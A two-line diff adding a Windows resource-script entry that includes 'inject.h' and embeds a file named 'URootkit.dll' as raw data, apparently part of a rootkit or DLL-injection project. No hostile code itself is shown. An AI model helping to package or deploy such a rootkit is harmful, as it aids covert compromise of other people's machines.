@@ -1,0 +1,2 @@
+#include "../include/inject.h"
+IDR_UROOTKIT RCDATA "URootkit.dll"
